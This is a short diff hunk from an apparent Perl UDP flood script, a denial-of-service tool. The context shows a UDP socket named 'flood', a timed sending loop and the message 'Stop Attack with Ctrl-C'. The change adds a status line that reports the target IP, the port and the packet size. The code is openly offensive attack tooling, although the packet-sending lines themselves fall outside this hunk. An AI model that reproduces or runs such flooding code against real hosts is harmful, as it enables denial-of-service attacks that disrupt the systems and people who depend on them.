@@ -15,6 +15,9 @@ $endtime = time() + ($time ? $time : 9999999);
  
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
+print "UDP Flooding $ip " . ($port ? $port : "random") . " port with " .
+  ($size ? "$size-byte" : "random size") . " packets" .
+  ($time ? " for $time seconds" : "") . "\n";
 print "Stop Attack with Ctrl-C\n" unless $time;
  
 for (;time() <= $endtime;) {
